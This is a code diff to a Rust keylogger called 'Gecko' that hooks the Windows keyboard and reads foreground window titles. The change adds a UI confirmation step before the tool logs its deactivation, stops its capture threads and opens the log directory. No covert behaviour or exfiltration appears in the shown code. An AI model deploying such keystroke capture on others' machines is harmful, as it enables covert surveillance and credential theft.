@@ -2,11 +2,12 @@ use std::{collections::HashMap, fs::File, io::Write, process, sync::{mpsc, Arc, 
 use willhook::{keyboard_hook, InputEvent, KeyboardKey};
 use winapi::um::winuser::{GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL, VK_SHIFT};
 use winapi::um::winuser::GetAsyncKeyState;
-use crate::components::{self, filecreator::retrieve_directory};
+use crate::components::{self, filecreator::retrieve_directory, ui};
 
 pub fn activate_keylogger(file: Arc<Mutex<File>>) {
     // Create a channel for keylogger termination
     let (keylogger_sender, keylogger_receiver) = mpsc::channel();
+    let (pstatus_sender, pstatus_receiver) = mpsc::channel();
     let held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>> = Arc::new(Mutex::new(HashMap::new()));
     let held_keys_clone = Arc::clone(&held_keys);
     let h = keyboard_hook().unwrap();
@@ -25,39 +26,48 @@ pub fn activate_keylogger(file: Arc<Mutex<File>>) {
     });
     
     loop {
-        if exit_condition() {        
-            // Retrieve the directory path
-            let dir = match retrieve_directory() {
-                Ok(dir) => dir,
-                Err(err) => {
-                    eprintln!("Error retrieving directory path: {}", err);
-                    break;
+        if exit_condition() {      
+            let pstatus_sender_clone = pstatus_sender.clone(); // Clone pstatus_sender
+           
+            let _ui = thread::spawn(move || ui::gracefulshutdown::gracefulshutdown(pstatus_sender_clone));
+            _ui.join().unwrap();
+            if let Ok(_) = pstatus_receiver.try_recv() {
+                // Retrieve the directory path
+                let dir = match retrieve_directory() {
+                    Ok(dir) => dir,
+                    Err(err) => {
+                        eprintln!("Error retrieving directory path: {}", err);
+                        break;
+                    }
+                };
+            
+                // Write deactivation timestamp to the log file
+                let mut file_guard = file.lock().unwrap();
+                writeln!(file_guard, "Gecko deactivated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
+                drop(file_guard);
+            
+                // Send termination signal to the keylogger thread
+                if let Err(err) = keylogger_sender.send(()).map_err(|e| format!("Failed to send termination signal to keylogger thread: {}", e)) {
+                    eprintln!("{}", err);
                 }
-            };
-        
-            // Write deactivation timestamp to the log file
-            let mut file_guard = file.lock().unwrap();
-            writeln!(file_guard, "Gecko deactivated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
-            drop(file_guard);
-        
-            // Send termination signal to the keylogger thread
-            if let Err(err) = keylogger_sender.send(()).map_err(|e| format!("Failed to send termination signal to keylogger thread: {}", e)) {
-                eprintln!("{}", err);
-            }
 
-            // Send termination signal to the real-time interpreter thread
-            if let Err(err) = gsd_rti.send(true).map_err(|e| format!("Failed to send termination signal to real-time interpreter thread: {}", e)) {
-                eprintln!("{}", err);
-            }
-            std::thread::sleep(Duration::from_millis(100));
-            println!("Gecko deactivating....");
+                // Send termination signal to the real-time interpreter thread
+                if let Err(err) = gsd_rti.send(true).map_err(|e| format!("Failed to send termination signal to real-time interpreter thread: {}", e)) {
+                    eprintln!("{}", err);
+                }
+                std::thread::sleep(Duration::from_millis(100));
 
-            // Open the directory
-            if let Err(err) = open_directory(&dir) {
-                eprintln!("Error opening directory: {}", err);
-            }
-        
-            break;
+                println!("Gecko deactivating....");
+
+                // Open the directory
+                if let Err(err) = open_directory(&dir) {
+                    eprintln!("Error opening directory: {}", err);
+                }
+            
+                break;
+            } else {
+                continue;
+            }        
         }
         
         std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
